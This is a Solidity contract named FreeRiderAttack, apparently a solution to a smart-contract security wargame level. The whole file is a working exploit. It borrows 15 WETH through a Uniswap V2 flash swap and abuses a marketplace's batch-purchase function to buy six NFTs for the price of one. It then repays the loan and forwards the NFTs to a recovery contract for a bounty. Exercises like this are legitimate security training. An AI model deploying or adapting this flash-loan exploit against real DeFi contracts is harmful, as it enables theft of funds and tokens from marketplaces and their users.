// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

contract FreeRiderAttack {

    IUniswapV2Pair private immutable pair;
    IMarketplace private immutable marketplace;

    IWETH private immutable weth;
    IERC721 private immutable nft;

    address private immutable recoveryContract;
    address private immutable player;

    uint256 private constant NFT_PRICE = 15 ether;
    uint256[] private tokens = [0, 1, 2, 3, 4, 5];

    constructor(address _pair, address _marketplace, address _weth, address _nft, address _recoveryContract){
        pair = IUniswapV2Pair(_pair);
        marketplace = IMarketplace(_marketplace);
        weth = IWETH(_weth);
        nft = IERC721(_nft);
        recoveryContract = _recoveryContract;
        player = msg.sender;
    }

    function attack() external payable {
        // Request a flashSwap of 15 WETH from Uniswap Pair
        // NOTE passing "0x" as the data to trigger the flash swap
        pair.swap(NFT_PRICE, 0, address(this), "0x");
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {

        // Access Control
        require(msg.sender == address(pair));
        require(tx.origin == player);

        // Unwrap WETH to native ETH
        weth.withdraw(NFT_PRICE);

        // Buy 6 NFTS for only 15 ETH total
        marketplace.buyMany{value: NFT_PRICE}(tokens);

        // Pay back 15WETH + 0.3% to the pair contract
        // 15044999999999998000 (15.045 ETH)
        uint256 amountToPayBack = NFT_PRICE * 1004 / 1000; 
        weth.deposit{value: amountToPayBack}();
        weth.transfer(address(pair), amountToPayBack);

        // Send NFTs to recovery contract so we can get the bounty
        bytes memory data = abi.encode(player);
        for(uint256 i; i < tokens.length; i++){
            /* NOTE triggers onERC721Received on the recovery contract
             so the data in this case must be the enceded player address
             since in the recovery contract onERC721Received function this data
             is decoded and used to send the bounty to it!
            */
            nft.safeTransferFrom(address(this), recoveryContract, i, data);
        }
        
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }


    receive() external payable {}

}